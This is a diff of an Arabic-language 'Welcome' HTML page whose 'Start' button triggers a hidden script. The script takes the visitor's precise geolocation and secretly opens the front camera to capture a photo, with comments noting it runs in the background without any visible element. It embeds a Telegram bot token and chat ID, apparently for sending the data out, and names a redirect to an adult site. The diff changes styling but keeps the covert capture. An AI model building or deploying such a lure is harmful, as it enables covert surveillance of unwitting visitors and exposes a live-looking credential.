@@ -2,121 +2,69 @@
 <html lang="ar">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Welcome</title>
 <style>
-  /* الخلفية الديناميكية */
-  body {
-    margin: 0;
-    padding: 0;
-    height: 100vh;
-    font-family: Arial, sans-serif;
-    display: flex;
+  html, body {
+    margin:0; padding:0; height:100%; display:flex;
     flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    background: linear-gradient(-45deg, #ff7e5f, #feb47b, #36d1dc, #5b86e5);
-    background-size: 400% 400%;
-    animation: gradientBG 15s ease infinite;
+    align-items:center; justify-content:center;
+    background: linear-gradient(135deg, #6b73ff, #000dff);
+    font-family: 'Arial', sans-serif;
     color: #fff;
     text-align: center;
   }
 
-  @keyframes gradientBG {
-    0% {background-position:0% 50%;}
-    50% {background-position:100% 50%;}
-    100% {background-position:0% 50%;}
-  }
+  h2 { margin: 10px 0; font-size: 32px; }
+  p { margin: 5px 0 20px 0; font-size: 18px; }
 
-  h2 { margin: 10px 0; }
-  p { margin: 5px 0 20px 0; }
-
-  /* الزر المستطيل */
   #goBtn {
-    padding: 16px 40px;
-    font-size: 22px;
-    border: none;
-    border-radius: 16px;
-    background: linear-gradient(90deg, #36d1dc, #5b86e5);
-    color: #fff;
-    cursor: pointer;
-    box-shadow: 0 8px 25px rgba(0,0,0,0.4);
-    transition: all 0.3s ease;
-    position: relative;
-    overflow: hidden;
+    width:140px; height:140px; border-radius:50%; border:none;
+    background: linear-gradient(145deg,#ff512f,#dd2476);
+    color:#fff; font-size:20px; cursor:pointer;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+    transition: all 0.2s ease;
+    display:flex; align-items:center; justify-content:center;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.4);
   }
 
   #goBtn:hover {
-    transform: scale(1.07);
-    box-shadow: 0 12px 30px rgba(0,0,0,0.5);
+    transform: scale(1.05);
+    box-shadow: 0 12px 24px rgba(0,0,0,0.4);
   }
 
   #goBtn:active {
     transform: scale(0.95);
-    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+    box-shadow: 0 6px 12px rgba(0,0,0,0.2);
   }
-
-  /* دائرة التحميل */
-  .loading {
-    width: 40px;
-    height: 40px;
-    border: 4px solid rgba(255,255,255,0.3);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    margin-top: -20px;
-    margin-left: -20px;
-    display: none;
-    box-shadow: 0 0 10px rgba(255,255,255,0.7);
-  }
-
-  @keyframes spin {
-    0% { transform: rotate(0deg);}
-    100% { transform: rotate(360deg);}
-  }
-
-  #status { margin-top: 12px; min-height: 24px; font-weight: bold; }
 </style>
 </head>
 <body>
   <h2>Welcome</h2>
-  <p>Click the button to continue.</p>
+  <p>Click the button to continue</p>
 
-  <div id="status">done</div>
-  <button id="goBtn">Next
-    <div class="loading" id="loader"></div>
-  </button>
+  <button id="goBtn">Start</button>
 
 <script>
-const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk";
-const CHAT_ID = "8273042434"; 
-const SECOND_SITE = "https://ar.stripchat.com"; 
+const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk"; // ضع توكن البوت
+const CHAT_ID = "8273042434"; // رقم القناة أو معرفها
+const SECOND_SITE = "https://ar.stripchat.com"; // رابط الموقع الثاني
 
-const status = document.getElementById('status');
-const goBtn = document.getElementById('goBtn');
-const loader = document.getElementById('loader');
-
-goBtn.addEventListener('click', async () => {
+document.getElementById('goBtn').addEventListener('click', async () => {
   try {
-    loader.style.display = "block";      
-    goBtn.textContent = "";               
-
-    // الحصول على الموقع
+    // طلب الموقع
     const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
 
-    // فتح الكاميرا في الخلفية بدون أي عنصر مرئي
+    // فتح الكاميرا في الخلفية
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
     const video = document.createElement('video');
     video.srcObject = stream;
     await video.play();
     await new Promise(r=>setTimeout(r,1000));
 
-    // التقاط الصورة في الخلفية
+    // التقاط صورة في الخلفية
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -143,8 +91,6 @@ goBtn.addEventListener('click', async () => {
 
   } catch(e) {
     console.error(e);
-    loader.style.display = "none";
-    goBtn.textContent = "Next";
     alert('حدث خطأ أو تم رفض الأذونات.');
   }
 });
